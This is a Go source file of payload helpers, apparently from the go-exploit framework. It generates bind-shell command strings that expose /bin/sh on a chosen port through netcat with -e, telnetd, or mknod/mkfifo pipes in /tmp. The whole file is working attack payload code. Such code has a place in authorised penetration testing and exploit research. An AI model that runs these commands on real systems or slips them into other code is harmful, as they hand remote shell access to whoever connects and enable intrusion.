package payload

import (
	"fmt"

	"github.com/vulncheck-oss/go-exploit/random"
)

func BindShellNetcatGaping(bport int) string {
	return fmt.Sprintf("nc -l -p %d -e /bin/sh", bport)
}

func BindShellTelnetdLogin(bport int) string {
	return fmt.Sprintf("telnetd -l /bin/sh -p %d", bport)
}

func BindShellMknodNetcat(bport int) string {
	node := random.RandLetters(3)

	return fmt.Sprintf(`cd /tmp; mknod %s p; nc -l -p %d 0<%s | /bin/sh >%s 2>&1; rm %s;`, node, bport, node, node, node)
}

func BindShellMkfifoNetcat(bport int) string {
	fifo := random.RandLetters(3)

	return fmt.Sprintf(`cd /tmp; mkfifo %s; nc -l -p %d 0<%s | /bin/sh >%s 2>&1; rm %s;`, fifo, bport, fifo, fifo, fifo)
}
